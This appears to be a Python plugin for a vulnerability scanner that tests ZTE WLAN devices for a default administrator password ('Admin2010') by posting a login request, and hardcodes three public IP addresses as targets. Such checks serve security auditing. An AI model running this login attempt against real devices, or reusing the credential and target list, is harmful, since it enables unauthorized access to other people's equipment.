#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer: 0day

import  re

def assign(service, arg):
    if service == "zte":
        return True, arg
        
def audit(arg):
    payload = "login.php"
    url = arg + payload
    postpayload = "tip=&UserName=admin&PassWord=Admin2010&LoginEnglish=Login&LoginTraditionalChinese=%E7%99%BB+%E9%8C%84"
    code, head, res, errcode, _ = curl.curl2(url, postpayload)
    if code==200 and '0 == 1' not in res:
        security_hole('zte-wlan' + url +' weak password admin Admin2010')

if __name__ == '__main__':
    from dummy import *
    audit(assign('zte','https://171.211.225.98/')[1])
    audit(assign('zte','https://223.82.209.82/')[1])
    audit(assign('zte','https://118.112.184.71/')[1])